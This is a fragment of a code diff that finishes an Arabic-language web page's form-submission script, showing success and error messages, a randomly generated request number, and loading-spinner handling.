+                <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
+              </div>
+            `;
+            form.innerHTML = successHTML;
+          } else {
+            // إظهار رسالة الخطأ مع تفاصيل
+            const errorHTML = `
+              <div class="error-message">
+                <h3>خطأ في الإرسال! ❌</h3>
+                <p>${result.description || 'حدث خطأ غير معروف'}</p>
+                <p>يرجى المحاولة مرة أخرى</p>
+              </div>
+            `;
+            form.innerHTML = errorHTML;
+          }
+        } catch (error) {
+          // إظهار رسالة الخطأ مع تفاصيل
+          const errorHTML = `
+            <div class="error-message">
+              <h3>خطأ في الإرسال! ❌</h3>
+              <p>${error.message || 'حدث خطأ غير معروف'}</p>
+              <p>يرجى المحاولة مرة أخرى</p>
+            </div>
+          `;
+          form.innerHTML = errorHTML;
+        } finally {
+          // إعادة عرض زر الإرسال
+          submitBtn.style.display = "block";
+          loadingSpinner.style.display = "none";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
